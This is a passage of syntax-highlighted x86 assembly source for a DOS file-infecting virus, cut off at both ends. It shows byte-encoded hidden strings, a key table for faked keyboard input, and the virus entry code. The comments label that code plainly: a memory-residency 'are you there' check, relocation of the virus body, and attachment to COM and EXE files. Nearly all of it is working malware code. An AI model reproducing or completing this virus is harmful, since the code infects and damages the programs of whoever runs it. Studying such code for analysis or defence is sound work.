    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0DDH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CBH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">STRNG5</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0D8H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CBH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C2H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DCH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E1H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0D5H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">STRNG6</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0C9H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CCH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C4H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">STRNG7</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CCH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">STRNG8</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0FBH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CBH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0CAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C9H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C2H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C2H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C8H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6H</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc1">; Each entry is:</span><span class="sc0">
        </span><span class="sc1">;           DB  length to find</span><span class="sc0">
        </span><span class="sc1">;           DB  length found</span><span class="sc0">
        </span><span class="sc1">;           DW  pointer to string</span><span class="sc0">

</span><span class="sc5">TABLE</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">STRNG1</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">STRNG2</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">7</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">STRNG3</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">STRNG4</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">STRNG5</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">STRNG6</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc5">STRNG7</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TABOUT</span><span class="sc0">  </span><span class="sc9">DW</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">; Table entry for output</span><span class="sc0">

    </span><span class="sc1">; Key number table for fake input</span><span class="sc0">

</span><span class="sc5">KEYTAB</span><span class="sc0">  </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">03H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">22H</span><span class="sc0">  </span><span class="sc1">; 00 - 07</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18H</span><span class="sc0">  </span><span class="sc1">; 08 - 0F</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">19H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11H</span><span class="sc0">  </span><span class="sc1">; 10 - 17</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">2DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CH</span><span class="sc0">  </span><span class="sc1">; 18 - 1F</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">39H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28H</span><span class="sc0">  </span><span class="sc1">; 20 - 27</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">33H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35H</span><span class="sc0">  </span><span class="sc1">; 28 - 2F</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">0BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08H</span><span class="sc0">  </span><span class="sc1">; 30 - 37</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">09H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">27H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">27H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">33H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">34H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">35H</span><span class="sc0">  </span><span class="sc1">; 38 - 3F</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">03H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">22H</span><span class="sc0">  </span><span class="sc1">; 40 - 47</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">23H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18H</span><span class="sc0">  </span><span class="sc1">; 48 - 4F</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">19H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11H</span><span class="sc0">  </span><span class="sc1">; 50 - 57</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">2DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CH</span><span class="sc0">  </span><span class="sc1">; 58 - 5F</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">29H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2EH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">22H</span><span class="sc0">  </span><span class="sc1">; 60 - 67</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">23H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">17H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">26H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">31H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">18H</span><span class="sc0">  </span><span class="sc1">; 68 - 6F</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">19H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">14H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2FH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11H</span><span class="sc0">  </span><span class="sc1">; 70 - 77</span><span class="sc0">
    </span><span class="sc9">DB</span><span class="sc0">  </span><span class="sc2">2DH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2CH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">29H</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EH</span><span class="sc0">  </span><span class="sc1">; 78 - 7F</span><span class="sc0">

    </span><span class="sc1">; This section assumes a COM origin of 100H</span><span class="sc0">


</span><span class="sc5">BP0010</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CLD</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0E1H</span><span class="sc0">         </span><span class="sc1">; Virus "are you there" call</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Virus - 1)</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0E1H</span><span class="sc0">         </span><span class="sc1">; Test for unchanged</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0020</span><span class="sc0">          </span><span class="sc1">; Branch if invalid reply</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Test for standard "yes"</span><span class="sc0">
    </span><span class="sc6">JB</span><span class="sc0">  </span><span class="sc5">BP0020</span><span class="sc0">          </span><span class="sc1">; Branch if non-standard</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0DDH</span><span class="sc0">         </span><span class="sc1">; Replace program over virus</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc2">0100H</span><span class="sc0">        </span><span class="sc1">; Initial offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; Length of virus</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">           </span><span class="sc1">; Add initial offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">F_SIZE</span><span class="sc4">[</span><span class="sc8">DI</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Get total filesize</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Virus - 2)</span><span class="sc0">

    </span><span class="sc1">; Virus not in system, or non-communicating variety</span><span class="sc0">

</span><span class="sc5">BP0020</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc0">           </span><span class="sc1">; Get current segment</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">          </span><span class="sc1">; Address past PSP</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PRG_SP</span><span class="sc4">,</span><span class="sc8">SP</span><span class="sc0">       </span><span class="sc1">; Save current value</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Set up stack</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc4">+</span><span class="sc2">100H</span><span class="sc0">   </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; Segment for return</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">BP0030</span><span class="sc0">    </span><span class="sc1">; \ Offset for return</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">RETF</span><span class="sc0">                </span><span class="sc1">; "Return" to next instruction</span><span class="sc0">

    </span><span class="sc1">; We now have an origin of zero</span><span class="sc0">
    </span><span class="sc1">; Entry point when attached to an EXE file</span><span class="sc0">

</span><span class="sc5">BP0030</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CLD</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">ST_ES1</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; Save original ES</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PPB_03</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; \
    MOV PPB_05,ES       ;  ) Segments in PPB</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">PPB_07</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">ES</span><span class="sc0">           </span><span class="sc1">; \ Segment relocation factor</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">10H</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">PRGSEG</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Initial code segment store</span><span class="sc0">
    </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc5">PRG_SS</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; Initial stack segment store</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0E1H</span><span class="sc0">         </span><span class="sc1">; Virus "are you there" call</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">21H</span><span class="sc0">         </span><span class="sc1">; DOS service (Virus - 1)</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0E1H</span><span class="sc0">         </span><span class="sc1">; Test for unchanged</span><span class="sc0">
    </span><span class="sc6">JNB</span><span class="sc0"> </span><span class="sc5">BP0040</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; Test for standard "yes"</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc5">PRG_SS</span><span class="sc0">       </span><span class="sc1">; Initial stack segment store</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc5">PRG_SP</span><span class="sc0">       </span><span class="sc1">; Initial stack pointer store</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">PROGRM</span><span class="sc0">          </span><span class="sc1">; Start of actual program</span><span class="sc0">

    </span><span class="sc1">; Virus is not already active</span><span class="sc0">

</span><span class="sc5">BP0040</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Address page zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW03FC</span><span class="sc0">       </span><span class="sc1">; \ Save system area data (1)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">SS_ST1</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">BB03FE</span><span class="sc0">       </span><span class="sc1">; \ Save system area data (2)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">SS_ST2</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW03FC</span><span class="sc4">,</span><span class="sc2">0A4F3H</span><span class="sc0">       </span><span class="sc1">; Store   REPZ  MOVSB</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BB03FE</span><span class="sc4">,</span><span class="sc2">0CBH</span><span class="sc0">     </span><span class="sc1">; Store   RETF</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">          </span><span class="sc1">; \
    ADD AX,10H          ;  ) Address past PSP</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set DS to CS</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">ENDADR</span><span class="sc0">    </span><span class="sc1">; Length of virus</span><span class="sc0">
